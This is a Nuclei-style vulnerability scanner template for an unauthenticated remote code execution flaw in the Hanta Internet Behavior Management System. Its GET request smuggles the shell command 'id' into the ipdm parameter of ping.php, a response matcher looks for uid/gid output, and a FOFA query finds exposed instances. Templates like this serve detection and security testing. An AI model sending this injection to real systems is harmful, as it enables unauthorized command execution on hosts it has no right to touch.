http:
    - matchers:
        - part: body
          regex:
            - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
          type: regex
        - part: header
          type: word
          words:
            - text/html
        - status:
            - 200
          type: status
      matchers-condition: and
      method: GET
      path:
        - '{{BaseURL}}/dgn/dgn_tools/ping.php?ipdm=2;id;'
id: hanta-rce
info:
    author: momika233
    metadata:
        fofa-query: app="汉塔科技上网行为管理系统"
        max-request: 1
        verified: true
    name: Hanta Internet Behavior Management System - Remote Code Execution
    severity: high
    tags:
        - hanta
        - unauth
        - 汉塔科技上网行为管理系统
